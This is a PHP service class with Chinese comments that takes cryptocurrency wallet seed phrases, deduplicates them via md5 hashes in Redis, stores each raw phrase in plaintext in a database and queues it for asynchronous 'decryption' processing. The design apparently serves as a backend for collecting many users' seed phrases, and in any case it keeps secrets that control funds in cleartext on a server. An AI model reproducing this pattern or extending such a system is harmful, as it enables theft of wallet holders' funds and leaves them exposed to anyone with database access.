<?php

namespace app\common\service\common;

use app\common\facade\Redis;
use app\common\model\ImportMnemonicModel;

/**
 * 助记词服务
 * @author Bin
 * @time 2023/8/1
 */
class MnemonicService
{
    /**
     * 通过助记词导入钱包
     * @param string $mnemonic
     * @return bool
     * @author Bin
     * @time 2023/7/26
     */
    public function importWalletByMnemonic(string $mnemonic)
    {
        $mnemonic = trim($mnemonic);
        //检测助记词是否为空
        if (empty($mnemonic) || strlen($mnemonic) < 10) return false;
        //检测助记词是否已被导入
        if ($this->isImportMnemonic($mnemonic)) return false;
        //写入数据库
        try {
            $data = [
                'mnemonic'      => $mnemonic,
                'mnemonic_key'  => md5($mnemonic),
                'create_time'   => time(),
                'update_time'   => time(),
                'date_day'      => date('Ymd'),
                'type'          => isMnemonic($mnemonic) == 1 ? 1 : 2
            ];
            ImportMnemonicModel::new()->insert($data);
        }catch (\Exception $e){
            return false;
        }
        //异步解析
        publisher('asyncDecryptMnemonic', ['mnemonic' => $mnemonic, 'type' => $data['type']]);
        return true;
    }

    /**
     * 检测助记词是否已被导入
     * @param string $mnemonic
     * @param bool $is_update
     * @return bool
     * @author Bin
     * @time 2023/7/30
     */
    public function isImportMnemonic(string $mnemonic, bool $is_update = false)
    {
        //缓存key
        $key = 'import:mnemonic:list';
        //检测缓存
        if ($is_update || !Redis::has($key))
        {
            //获取助记词列表
            $list = ImportMnemonicModel::new()->listAllRow([], ['mnemonic_key']);
            foreach ($list as $value) Redis::addSet($key, $value['mnemonic_key'], 0);
        }
        //检测缓存是否存在
        return !Redis::addSet($key, md5($mnemonic), 0);
    }
}